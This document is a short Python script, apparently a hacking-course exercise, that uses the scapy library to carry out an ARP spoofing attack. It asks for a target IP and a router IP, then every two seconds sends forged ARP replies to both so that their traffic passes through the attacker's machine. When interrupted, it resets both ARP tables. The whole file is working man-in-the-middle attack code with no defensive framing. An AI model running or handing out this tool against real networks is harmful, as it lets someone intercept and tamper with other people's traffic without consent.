#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_part = scapy.ARP(pdst=ip)
    broadcast_part = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = broadcast_part / arp_part
    ans_list = scapy.srp(packet, timeout=3, verbose=False)[0]
    return ans_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


print('''

 --->: enter ctrl + c (ctrl + f2 in pycharm) to exit ''')

target_ip = raw_input(' enter target_ip: ')
gateway_ip = raw_input(' enter router_ip: ')

try:
    packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_count = packet_count + 2
        print('\r packets sent: ' + str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print('''

 RESETTING ARP TABLE...PLEASE WAIT......''')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

print('''
 DONE
''')

